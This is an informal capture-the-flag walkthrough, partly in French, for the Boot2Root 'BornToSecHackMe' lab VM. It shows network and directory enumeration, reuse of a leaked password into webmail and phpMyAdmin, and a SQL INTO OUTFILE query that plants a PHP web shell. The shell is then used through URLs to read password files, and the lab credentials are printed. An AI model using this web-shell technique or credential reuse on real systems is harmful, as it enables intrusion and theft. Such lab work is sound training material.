 ____              _   ___  _____             _   
 |  _ \            | | |__ \|  __ \           | |  
 | |_) | ___   ___ | |_   ) | |__) |___   ___ | |_ 
 |  _ < / _ \ / _ \| __| / /|  _  // _ \ / _ \| __|
 | |_) | (_) | (_) | |_ / /_| | \ \ (_) | (_) | |_ 
 |____/ \___/ \___/ \__|____|_|  \_\___/ \___/ \__|
 
 
After the setup we are presented with 

![BorntoSec](https://github.com/Ziltoid42/Boot2Root_42/blob/master/bonus/setup.png)




Enter: ifconfig

-----------------
Install nmap via brew
-----------------

ifconfig should display a range of IP for the vm between 1 and 255

execute:
nmap <IP>.1-255

--> This should give back the precise IP and the open ports.
80 should be open and accessible Through a web browser
It is a Wordpress

--------------------


Avec nmap on recupere les ports, il y a un http et un https sur l'adresse IP 192.168.99.100

On recupere un script appelle DIRB qui a partir d'un dictionnaire teste la presence d'elements dans l'arboressence.
https://sourceforge.net/projects/dirb/i


En testant ./dirb https://192.168.99.100/ wordlists/common.txt -w

on se rend compte qu'il y a :
un forum auquel on peut acceder par navigateur
un webmail https://192.168.99.100/webmail/src/login.php
un phpmyadmin


Il y a un lien qui liste les users https://192.168.99.100/forum/index.php?mode=user

lmezard a un seul poste dans : "Probleme login ?"

dans probleme login il y a une entree etrange --> Failed password for invalid user !q\]Ej?*5K5cy*AJ from
On vois quil existe un user "root"
il y a aussi un "Oct 5 14:54:29 BornToSecHackMe sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/sh" ?

Si on essaie !q\]Ej?*5K5cy*AJ en password pour lmezard ca passe.
on peut recuperer son mail --> laurie@borntosec.net

On va le tenter dans le webmail avec le meme password et ca passe ouuuuuh!!!!

IL Y A UN MESSAGE DB ACCESS !!!

-->
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
-->
Bouyaaa !!!

il y a aussi les mails de
ft_root@mail.borntosec.net
qudevide@mail.borntosec.net

En magouillant un peu sur le login de phpmyadmin
login: root
pass: Fg-'kKXBj87E:aJ$

CA PASSE

On suis ce tuto :http://www.informit.com/articles/article.aspx?p=1407358&seqNum=2

Ils nous donnent:
select “<? System($_REQUEST[‘cmd’]); ?>” into outfile “/cmd.php”;

Cela permet d'inserer un shell basique qui prend des commandes via url, mais il faut trouver ou le placer

Vue que c'est un site web il sera en  /var/www/html/

en tentant les differents sous dossiers de dossier de forum (obtenus via DIRB)
on arrive finalement a placer dans template_c

SELECT "<? System($_REQUEST['cmd']); ?>" into outfile "/var/www/forum/templates_c/cmd.php";

A partir de la on peux lancer des commandes via le navigateur, notament ls pour comprendre l'arborecense

https://192.168.99.100/forum/templates_c/cmd.php?cmd=ls%20../../../../home

https://192.168.99.100/forum/templates_c/cmd.php?cmd=cat%20../../../../home/LOOKATME/password
Montre un dossier LOOKATME avec dedans un Login/Password :
lmezard:G!@M6f4Eatau{sF"

en se connectant en ftp on peut entrer ce password et acceder a un README : "Complete this little challenge and use the result as password for user 'laurie' to login in ssh"

et a un fichier fun

Ce fichier fun contiens des instructions:




Password SSH de Laurie

laurie / 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

